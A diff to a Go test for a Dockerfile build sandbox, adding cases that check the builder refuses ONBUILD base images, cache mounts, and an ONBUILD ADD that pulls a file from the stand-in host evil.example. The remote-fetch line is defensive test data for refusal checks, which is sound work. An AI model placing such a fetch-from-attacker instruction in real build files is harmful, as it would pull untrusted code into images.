@@ -235,10 +235,14 @@ func TestBuildRefusesEscapes(t *testing.T) {
 		"vertical tab FROM":  {dockerfileRepo("FROM alpine:3\nFROM\vmissing.example/base:1\n"), BuildDockerfileRefused},
 		"mount From upper":   {dockerfileRepo("FROM alpine:3\nRUN --mount=type=bind,From=missing.example/base:1,target=/m true\n"), BuildBaseImageMissing},
 		"numeric FROM":       {dockerfileRepo("FROM 1234\n"), BuildBaseImageMissing},
+		"base onbuild":       {dockerfileRepo("FROM onbuild.example/base:1\n"), BuildImageRefused},
+		"onbuild":            {dockerfileRepo("FROM alpine:3 AS a\nONBUILD ADD https://evil.example/x /x\nFROM a\n"), BuildDockerfileRefused},
+		"cache mount":        {dockerfileRepo("FROM alpine:3\nRUN --mount=type=cache,target=/root/.npm true\n"), BuildDockerfileRefused},
 	}
 	for name, tt := range tests {
 		t.Run(name, func(t *testing.T) {
 			rec := withBuilds(&recorder{}, 0, "missing.example/base:1", "1234")
+			rec.images["onbuild.example/base:1"] = cliResult{stdout: []byte(dockerInspectOnBuild)}
 			s := testSandbox(t, rec)
 			app, err := s.Build(context.Background(), tt.repo)
 			if err != nil || app.Built() || app.Unavailable != tt.reason {
